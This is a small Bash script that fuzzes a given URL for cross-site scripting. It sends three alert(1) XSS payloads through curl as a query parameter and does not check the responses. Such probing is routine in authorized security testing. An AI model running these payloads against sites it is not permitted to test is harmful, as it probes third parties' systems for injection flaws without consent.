#!/usr/bin/env bash
# Simple XSS fuzzing via curl
set -euo pipefail

usage() {
    echo "Usage: $0 <url>"
}

if [[ $# -ne 1 ]]; then
    usage
    exit 1
fi

URL="$1"

payloads=('"<script>alert(1)</script>"' "'\><svg onload=alert(1)>" "\">\"><img src=x onerror=alert(1)>" )

if ! command -v curl >/dev/null 2>&1; then
    echo "curl is required" >&2
    exit 1
fi

for p in "${payloads[@]}"; do
    curl -G --data-urlencode "q=$p" "$URL" -s -o /dev/null
    echo "Sent payload $p"
done
